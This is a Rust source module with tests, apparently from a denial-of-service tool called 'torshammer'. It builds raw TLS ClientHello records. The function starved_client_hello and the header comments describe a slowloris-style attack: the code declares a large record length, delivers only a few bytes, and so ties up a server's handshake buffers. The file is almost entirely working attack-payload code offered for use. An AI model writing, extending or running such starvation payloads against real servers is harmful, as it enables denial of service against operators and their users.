//! Minimal, dependency-free TLS record + handshake builders.
//!
//! This module is the Rust mirror of `src/torshammer/tls.py`: it lets the
//! Tier-4 TLS-handshake attack profiles emit *real* TLS handshake wire bytes
//! with nothing but the standard library. It is a serializer only - no key
//! exchange, no cipher state, no response parsing - which is exactly what the
//! handshake-starvation profiles need: they pin a server's handshake reassembly
//! buffer / renegotiation state by over-promising a record and never completing
//! it, without ever establishing a session. The Python companion is kept
//! byte-for-byte equivalent and shares `tests/mode_list.txt` as the parity
//! contract.
//!
//! A TLS record (RFC 5246 6.2.1) is a 1-octet content type, a 2-octet version
//! and a 16-bit length, then the fragment. A handshake message inside a record
//! carries a 1-octet type and a 24-bit length. The profiles deliberately declare
//! a record length far larger than the bytes they deliver, so a conforming
//! server sizes its handshake buffer from that length and blocks - the TLS-layer
//! analogue of slowloris.

/// Maximum plaintext record fragment (2**14).
pub const MAX_RECORD: usize = 1 << 14;

// Record content types (RFC 5246 6.2.1).
pub const CONTENT_HANDSHAKE: u8 = 0x16;
#[allow(dead_code)]
pub const CONTENT_APPLICATION_DATA: u8 = 0x17;

// Handshake message types (RFC 5246 7.4).
pub const HS_CLIENT_HELLO: u8 = 0x01;
#[allow(dead_code)]
pub const HS_SERVER_HELLO: u8 = 0x02;
#[allow(dead_code)]
pub const HS_CERTIFICATE: u8 = 0x0B;
#[allow(dead_code)]
pub const HS_SERVER_HELLO_DONE: u8 = 0x0E;
#[allow(dead_code)]
pub const HS_FINISHED: u8 = 0x14;

// Record-layer protocol versions.
pub const SSL31: u16 = 0x0301;
pub const TLS12: u16 = 0x0303;

/// A well-known cipher-suite list so the ClientHello looks plausible.
const DEFAULT_CIPHER_SUITES: [u16; 5] = [0x1301, 0x1302, 0x1303, 0xC02F, 0xC030];

/// A 5-octet TLS record header that *declares* `declared_len` payload bytes.
/// Panics if `declared_len` does not fit the 16-bit length field.
pub fn record_header(content_type: u8, version: u16, declared_len: usize) -> Vec<u8> {
    assert!(
        declared_len <= 0xFFFF,
        "record length does not fit the 16-bit field"
    );
    let mut out = Vec::with_capacity(5);
    out.push(content_type);
    out.extend_from_slice(&version.to_be_bytes());
    out.extend_from_slice(&(declared_len as u16).to_be_bytes());
    out
}

/// A complete TLS record whose header length matches `payload`.
#[allow(dead_code)]
pub fn record(content_type: u8, payload: &[u8], version: u16) -> Vec<u8> {
    let mut out = record_header(content_type, version, payload.len());
    out.extend_from_slice(payload);
    out
}

/// A handshake message header (type + 24-bit length) + `body`.
#[allow(dead_code)]
pub fn handshake(hs_type: u8, body: &[u8]) -> Vec<u8> {
    let len = (body.len() as u32).to_be_bytes();
    let mut out = Vec::with_capacity(4 + body.len());
    out.push(hs_type);
    out.extend_from_slice(&len[1..]);
    out.extend_from_slice(body);
    out
}

/// Serialize the body of a plausible TLS 1.2/1.3 ClientHello (no extensions).
/// Panics unless `random_bytes` is exactly 32 octets (the ClientHello random).
pub fn client_hello_body(random_bytes: &[u8]) -> Vec<u8> {
    assert_eq!(
        random_bytes.len(),
        32,
        "ClientHello random must be exactly 32 bytes"
    );
    let mut body = Vec::new();
    body.extend_from_slice(&TLS12.to_be_bytes());
    body.extend_from_slice(random_bytes);
    body.push(0); // empty session id
    let suite_bytes: Vec<u8> = DEFAULT_CIPHER_SUITES
        .iter()
        .flat_map(|s| s.to_be_bytes())
        .collect();
    body.extend_from_slice(&(suite_bytes.len() as u16).to_be_bytes());
    body.extend_from_slice(&suite_bytes);
    body.extend_from_slice(&[1, 0x00]); // one compression method: NULL
    body
}

/// A complete, internally-consistent ClientHello handshake message.
#[allow(dead_code)]
pub fn client_hello(random_bytes: &[u8]) -> Vec<u8> {
    handshake(HS_CLIENT_HELLO, &client_hello_body(random_bytes))
}

/// The opening bytes of a ClientHello that under-delivers its record length.
///
/// Emits a handshake *record* header declaring `declared_record_len` payload
/// octets and a ClientHello handshake header declaring `declared_record_len - 4`
/// message octets, followed by only `header_body_bytes` real body octets. The
/// two declared lengths agree with each other but far exceed what is sent, so a
/// server that reads the record header blocks waiting for a full handshake
/// record that never arrives.
pub fn starved_client_hello(
    random_bytes: &[u8],
    declared_record_len: usize,
    header_body_bytes: usize,
) -> Vec<u8> {
    let msg_len = (declared_record_len - 4) as u32;
    let body = client_hello_body(random_bytes);
    let mut out = record_header(CONTENT_HANDSHAKE, SSL31, declared_record_len);
    out.push(HS_CLIENT_HELLO);
    out.extend_from_slice(&msg_len.to_be_bytes()[1..]);
    out.extend_from_slice(&body[..header_body_bytes]);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn be3(body: &[u8]) -> usize {
        ((body[0] as usize) << 16) | ((body[1] as usize) << 8) | body[2] as usize
    }

    #[test]
    fn record_header_layout() {
        let raw = record_header(CONTENT_HANDSHAKE, SSL31, 300);
        assert_eq!(raw.len(), 5);
        assert_eq!(raw[0], CONTENT_HANDSHAKE);
        assert_eq!(u16::from_be_bytes(raw[1..3].try_into().unwrap()), SSL31);
        assert_eq!(u16::from_be_bytes(raw[3..5].try_into().unwrap()), 300);
    }

    #[test]
    #[should_panic]
    fn record_header_rejects_oversize_length() {
        record_header(CONTENT_HANDSHAKE, SSL31, 0x10000);
    }

    #[test]
    fn record_matches_payload_length() {
        let payload = [1u8, 2, 3, 4, 5];
        let raw = record(CONTENT_APPLICATION_DATA, &payload, SSL31);
        assert_eq!(
            raw[..5],
            record_header(CONTENT_APPLICATION_DATA, SSL31, payload.len())
        );
        assert_eq!(&raw[5..], &payload);
    }

    #[test]
    fn handshake_header_type_and_24bit_length() {
        let raw = handshake(HS_CLIENT_HELLO, b"abc");
        assert_eq!(raw[0], HS_CLIENT_HELLO);
        assert_eq!(be3(&raw[1..4]), 3);
        assert_eq!(&raw[4..], b"abc");
    }

    #[test]
    fn client_hello_body_structure() {
        let rand: Vec<u8> = (0..32u8).collect();
        let body = client_hello_body(&rand);
        assert_eq!(u16::from_be_bytes(body[0..2].try_into().unwrap()), TLS12);
        assert_eq!(&body[2..34], &rand[..]);
        assert_eq!(body[34], 0); // empty session id
        let suite_len = u16::from_be_bytes(body[35..37].try_into().unwrap()) as usize;
        assert_eq!(suite_len, 10);
        let suites_end = 37 + suite_len;
        assert_eq!(body[suites_end], 1); // one compression method
        assert_eq!(body[suites_end + 1], 0x00); // NULL compression
        assert_eq!(body.len(), suites_end + 2);
    }

    #[test]
    #[should_panic]
    fn client_hello_body_requires_32_byte_random() {
        client_hello_body(b"short");
    }

    #[test]
    fn client_hello_is_a_handshake_message() {
        let msg = client_hello(&[0u8; 32]);
        assert_eq!(msg[0], HS_CLIENT_HELLO);
        assert_eq!(be3(&msg[1..4]), msg.len() - 4);
    }

    #[test]
    fn starved_client_hello_under_delivers() {
        let raw = starved_client_hello(&[0u8; 32], MAX_RECORD, 8);
        assert_eq!(raw[0], CONTENT_HANDSHAKE);
        assert_eq!(u16::from_be_bytes(raw[1..3].try_into().unwrap()), SSL31);
        let declared = u16::from_be_bytes(raw[3..5].try_into().unwrap()) as usize;
        assert_eq!(declared, MAX_RECORD);
        assert_eq!(raw[5], HS_CLIENT_HELLO);
        assert_eq!(be3(&raw[6..9]), declared - 4);
        // 5-byte record header + 4-byte handshake header + 8 body octets only.
        assert_eq!(raw.len(), 5 + 4 + 8);
        assert!(raw.len() < declared);
    }
}
